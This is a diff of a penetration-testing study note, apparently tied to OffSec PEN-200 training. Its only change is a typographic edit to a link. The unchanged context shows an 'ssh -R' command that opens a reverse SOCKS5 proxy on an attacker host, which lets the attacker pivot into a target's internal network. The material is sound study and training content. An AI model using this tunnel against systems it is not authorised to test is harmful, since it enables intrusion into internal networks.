@@ -13,4 +13,4 @@ ssh -R $PORT $USER@$ATTACKER
 
 This will open up $PORT on $ATTACKER, which can then be used as a SOCKS5 proxy by applications on $ATTACKER. Useful for gaining access to machines on an internal network that may be visible to $TARGET but not $ATTACKER.
 
-* [2022-08-31 - OffSec Live: PEN-200](../log/2022-08-31-offsec-live-pen-200.md)
+* [2022-08-31 — OffSec Live: PEN-200](../log/2022-08-31-offsec-live-pen-200.md)
